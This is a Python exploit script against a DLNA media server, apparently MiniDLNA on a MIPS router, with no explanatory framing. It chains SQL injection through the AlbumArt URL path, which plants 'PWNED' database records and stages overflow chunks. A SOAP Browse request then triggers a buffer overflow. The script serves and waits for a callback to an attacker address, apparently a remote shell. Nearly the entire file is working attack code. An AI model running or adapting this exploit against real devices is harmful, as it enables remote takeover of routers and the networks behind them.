#!/usr/bin/env python

import math
import sys
import urllib,socket,os,httplib
import time

from overflowdata import DLNAOverflow


class Logging:
    WARN=0
    INFO=1
    DEBUG=2
    prefixes=[]
    prefixes.append(" [!] ")
    prefixes.append(" [+] ")
    prefixes.append(" [@] ")
    @classmethod
    def log_msg_start(klass,msg,level=INFO):
        pref=Logging.prefixes[level]
        sys.stdout.write(pref+msg)
        sys.stdout.flush()

    @classmethod
    def log_msg_end(klass,msg):
        print msg

    @classmethod
    def log_msg(klass,msg,level=INFO):
        msg="%s\n"%msg
        klass.log_msg_start(msg,level)

headers={"Host":"10.10.10.1"}
soap_headers={"Host":"10.10.10.1",
                "SOAPACTION":'"urn:schemas-upnp-org:service:ContentDirectory:1#Browse"',
                "content-type":'text/xml ;charset="utf-8"',
                "connection":"close"}


host="10.10.10.1"
COUNT=32
empty=''
SLEEP=1
shellcodes=[]
NOP_STRING_COUNT=1


MIPSBREAK="\x4d\x08\x21\x02"*4

badchars={'\x0d':"x'0d'",
        '\x2d':"x'2d'",
        '\x20':"x'20'"}

path_beginning='/AlbumArt/1;'
path_ending='-18.jpg'



details_insert_query='insert/**/into/**/DETAILS(ID'+\
                                                ',SIZE'+\
                                                ',TITLE'+\
                                                ',ARTIST'+\
                                                ',ALBUM'+\
                                                ',TRACK'+\
                                                ',DLNA_PN'+\
                                                ',MIME'+\
                                                ',ALBUM_ART'+\
                                                ',DISC)'+\
                                                '/**/VALUES("31337"'+\
                                                ',"PWNED"'+\
                                                ',"PWNED"'+\
                                                ',"PWNED"'+\
                                                ',"PWNED"'+\
                                                ',"PWNED"'+\
                                                ',"PWNED"'+\
                                                ',"PWNED"'+\
                                                ',"1"'+\
                                                ',"PWNED");'

objects_insert_query='insert/**/into/**/OBJECTS(OBJECT_ID,PARENT_ID,CLASS,DETAIL_ID)'+\
                    '/**/VALUES("PWNED","PWNED","container","31337");'

details_delete_query='delete/**/from/**/DETAILS/**/where/**/ID="31337";'

objects_delete_query='delete/**/from/**/OBJECTS/**/where/**/OBJECT_ID="PWNED";'

def print_progress(bytes_written,total_bytes):
    percent=(bytes_written/float(total_bytes))*100
    marks=int(math.floor(percent / 2))
    dots=50-marks
    markstring="#" * marks
    dotstring="." * dots
    sys.stdout.write("\r[%s%s] %0.2f%%"%(markstring,dotstring,percent))
    sys.stdout.flush()



def build_injection_req(query):
    request=path_beginning+query+path_ending
    return request

def build_soap_request():
    request=""
    f=open("./soaprequest.xml",'r')
    for line in f.readlines():
        request+=line
    f.close()
    return request
def do_post_request(request):
    conn=httplib.HTTPConnection(host,8200,timeout=3)
    conn.request("POST","/ctl/ContentDir",request,soap_headers)
    try:
        resp=conn.getresponse()
        resp_data=resp.read()
    except:
        resp_data=None
    
    conn.close()
    return resp_data

def do_get_request(request):
    conn=httplib.HTTPConnection(host,8200)
    conn.request("GET",request,"",headers)
    conn.close()


def clear_overflow_data():
    Logging.log_msg_start("Deleting existing exploit data...")
    request=build_injection_req(details_delete_query)
    do_get_request(request)
    request=build_injection_req(objects_delete_query)
    do_get_request(request)
    time.sleep(SLEEP*5)
    Logging.log_msg_end("done.")

def stage_data(data):
    totalbytes=0
    sent=0
    for string in data:
        totalbytes+=len(string)

    print_progress(sent,totalbytes)
    for string in data:
        details_update_query='update/**/DETAILS/**/set/**/ALBUM_ART=ALBUM_ART||"'+\
                string+'"/**/where/**/ID="31337";'
    
        request=build_injection_req(details_update_query)
        do_get_request(request)
        sent+=len(string)
        print_progress(sent,totalbytes)
        time.sleep(SLEEP*0.5)

def insert_overflow_data(overflow_data):
    Logging.log_msg_start("Setting up initial database records....")
    request=build_injection_req(objects_insert_query)
    do_get_request(request)
    request=build_injection_req(details_insert_query)
    do_get_request(request)
    Logging.log_msg_end("done.")
    

    Logging.log_msg("Staging overflow....")
    Logging.log_msg("%d sections" % len(overflow_data))
    stage_data(overflow_data)
    Logging.log_msg_end("\n\t....done.")


def trigger_exploit():
    request=build_soap_request()
    resp=do_post_request(request)
    if resp==None:
        return True
    else:
        return False

callback_ip="10.10.10.2"
callback_port="8080"

if len(sys.argv) > 1 and sys.argv[1].startswith('find='):
    find=sys.argv[1].split('=')[1]
    found=DLNAOverflow(callback_ip,callback_port,badchars).find(find)
    print("found string %s at offset %d" % (find,found))
    sys.exit(0)

dlna_overflow=DLNAOverflow(callback_ip,callback_port,badchars,encode=True)

null_offsets=dlna_overflow.scan_for_nulls()

if len(null_offsets) !=0:
    print "found null bytes at offsets: %s" % str(null_offsets)
    exit(1)
else:
    print "found no null bytes."
    
clear_overflow_data()

insert_overflow_data(dlna_overflow.chunks(128))

dlna_overflow.serve_callback()
time.sleep(2)
Logging.log_msg_start("Attempting to trigger exploit....")
Logging.log_msg("Have a nice day!")
if trigger_exploit():
    dlna_overflow.wait_callback()
else:
    Logging.log_msg_end("FAILED.")
    dlna_overflow.wait_callback(kill=True)

